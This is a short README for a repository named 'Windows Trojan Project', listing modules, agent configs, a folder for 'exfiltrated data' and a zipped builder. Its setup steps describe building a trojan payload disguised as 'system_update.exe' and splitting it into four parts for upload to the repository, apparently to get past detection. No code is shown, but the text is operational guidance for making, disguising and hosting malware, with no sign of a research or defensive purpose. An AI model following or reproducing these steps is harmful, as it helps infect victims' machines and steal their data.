# Windows Trojan Project

## Structure
- `modules/`: Python capability modules.
- `config/`: Configuration files for agents.
- `data/`: Exfiltrated data.
- `source.zip`: **Source code** and **Builder** (`build.bat`).

## Setup Instructions
1. Download `source.zip`.
2. Extract it on your Windows VM.
3. Run `build.bat` to generate the payload (`system_update.exe`).
4. Split the payload into 4 parts:
   - `trojan_client_part_aa`
   - `trojan_client_part_ab`
   - `trojan_client_part_ac`
   - `trojan_client_part_ad`
5. Upload these 4 files to the root of this repository.
